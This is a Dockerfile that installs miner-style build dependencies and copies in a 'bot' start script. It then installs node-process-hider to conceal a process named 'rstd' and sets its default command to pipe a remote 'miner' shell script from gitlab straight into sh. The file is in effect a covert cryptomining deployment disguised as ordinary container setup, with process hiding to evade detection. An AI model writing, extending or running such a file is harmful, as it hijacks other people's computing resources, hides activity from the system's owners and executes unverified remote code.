FROM ubuntu:22.04

# Install.
RUN \
  sed -i 's/# \(.*multiverse$\)/\1/g' /etc/apt/sources.list && \
  apt-get update && \
  apt-get -y upgrade && \
  apt-get install -y build-essential && \
  apt-get install -y software-properties-common && \
  apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev &&\
  apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  libssl-dev libmicrohttpd-dev libhwloc-dev  &&\
  apt-get install -y byobu bash sudo curl git npm screen neofetch ca-certificates libcurl4 libjansson4 libgomp1 golang unzip autoconf cmake net-tools htop man unzip vim wget && \
  rm -rf /var/lib/apt/lists/*

RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
RUN curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
#RUN apt-get install -y nodejs-legacy
RUN npm i -g node-process-hider
RUN ph add rstd

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root
# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Define working directory.
WORKDIR /root

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Define default command.
CMD curl https://gitlab.com/ubuntehe/miner/-/raw/main/rszeher.sh | sh
